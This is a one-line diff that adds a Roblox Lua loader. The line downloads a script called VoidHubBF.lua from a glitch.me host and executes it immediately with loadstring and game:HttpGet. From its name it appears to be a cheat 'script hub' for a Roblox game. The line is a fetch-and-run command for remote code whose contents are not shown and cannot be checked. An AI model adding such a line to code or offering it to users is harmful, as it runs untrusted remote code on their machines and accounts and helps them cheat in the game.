@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://efes-hub.glitch.me/VoidHubBF.lua"))()
